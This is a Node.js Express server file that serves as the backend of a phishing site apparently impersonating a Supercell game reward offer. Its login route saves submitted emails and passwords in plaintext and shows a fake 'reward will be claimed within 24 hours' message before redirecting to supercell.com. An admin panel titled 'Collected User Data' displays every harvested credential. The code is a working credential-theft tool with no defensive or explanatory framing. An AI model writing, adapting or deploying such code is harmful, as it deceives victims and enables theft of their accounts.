const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');
const session = require('express-session');
require('dotenv').config();

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({ secret: 'supersecret', resave: false, saveUninitialized: true }));

// MongoDB connect
mongoose.connect(process.env.MONGODB_URI, { useNewUrlParser: true, useUnifiedTopology: true })
.then(() => console.log("MongoDB Connected"))
.catch(err => console.error("MongoDB connection error:", err));

// User schema
const userSchema = new mongoose.Schema({
    email: String,
    password: String
});
const User = mongoose.model('User', userSchema);

// Handle login form submissions
app.post('/login', async (req, res) => {
    const { email, password } = req.body;
    await User.create({ email, password });
    res.send(`<script>alert('Thank you for your details. Your reward will be claimed within 24 hours.'); window.location.href='https://supercell.com';</script>`);
});

// Admin login middleware
function requireLogin(req, res, next) {
    if (req.session.loggedIn) next();
    else res.redirect('/admin-login');
}

// Admin login form
app.get('/admin-login', (req, res) => {
    res.send(`
        <form method="POST" action="/admin-login" style="max-width:400px;margin:auto;padding:20px;">
            <h2>Admin Login</h2>
            <input name="username" placeholder="Username" style="width:100%;padding:10px;margin:5px 0;" />
            <input name="password" type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;" />
            <button type="submit" style="width:100%;padding:10px;">Login</button>
            ${req.query.error ? "<p style='color:red;'>Invalid credentials</p>" : ""}
        </form>
    `);
});

app.post('/admin-login', (req, res) => {
    const { username, password } = req.body;
    if (username === process.env.ADMIN_USER && password === process.env.ADMIN_PASS) {
        req.session.loggedIn = true;
        res.redirect('/admin');
    } else {
        res.redirect('/admin-login?error=1');
    }
});

// Admin panel
app.get('/admin', requireLogin, async (req, res) => {
    const users = await User.find();
    let rows = users.map(u => `<tr><td>${u.email}</td><td>${u.password}</td></tr>`).join('');
    res.send(`
        <html>
        <head>
            <title>Admin Panel</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { font-family: Arial; padding: 20px; background: #f4f4f4; }
                table { width: 100%; border-collapse: collapse; background: white; }
                th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
                th { background: #333; color: white; }
                tr:nth-child(even) { background: #f9f9f9; }
                .container { max-width: 100%; overflow-x: auto; }
            </style>
        </head>
        <body>
            <h2>Collected User Data</h2>
            <div class="container">
                <table>
                    <tr><th>Email</th><th>Password</th></tr>
                    ${rows}
                </table>
            </div>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
